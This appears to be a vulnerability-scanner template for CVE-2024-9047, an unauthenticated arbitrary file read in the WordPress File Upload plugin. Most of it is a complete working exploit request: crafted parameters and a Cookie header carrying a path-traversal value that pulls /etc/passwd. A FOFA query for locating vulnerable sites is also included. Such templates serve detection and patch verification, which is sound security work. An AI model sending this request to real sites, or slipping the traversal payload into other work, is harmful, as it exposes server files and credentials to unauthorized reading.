id: CVE-2024-9047
info:
  name: WordPress File Upload Plugin Arbitrary File Read
  author: ZacharyZcR
  severity: critical
  description: |
    WordPress File Upload plugin versions <= 4.24.11 contain an arbitrary file read vulnerability in wfu_file_downloader.php.
    Unauthenticated attackers can read sensitive files through path traversal, including configuration files and system files.
    FOFA: "wp-content/plugins/wp-file-upload"
  reference:
    - cve: CVE-2024-9047
  tags: wordpress,lfi,fileupload,plugin
  created: 2024/01/03

rules:
  r0:
    request:
      method: GET
      path: /wp-content/plugins/wp-file-upload/wfu_file_downloader.php
      params:
        file: pQ1DyzbQp5hBxQpW
        ticket: Hw8h7dBmxROx27ZZ
        handler: dboption
        session_legacy: '1'
        dboption_base: cookies
        dboption_useold: '0'
        wfu_cookie: wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce=cfyMMnYQqNBbcBNMLTCDnE7ezEAdzLC3; wfu_storage_pQ1DyzbQp5hBxQpW=/../../../../../etc/passwd[[name]]; wfu_download_ticket_Hw8h7dBmxROx27ZZ=1735045339664; wfu_ABSPATH=/;
        Connection: close
    expression: |
      response.status == 200 &&
      response.headers["Content-Type"].contains("octet-stream") &&
      response.headers["Content-Disposition"].contains("passwd") &&
      response.body.bcontains(b'root:x:0:0') &&
      response.body.bcontains(b'nobody:x:65534:65534:')

expression: r0()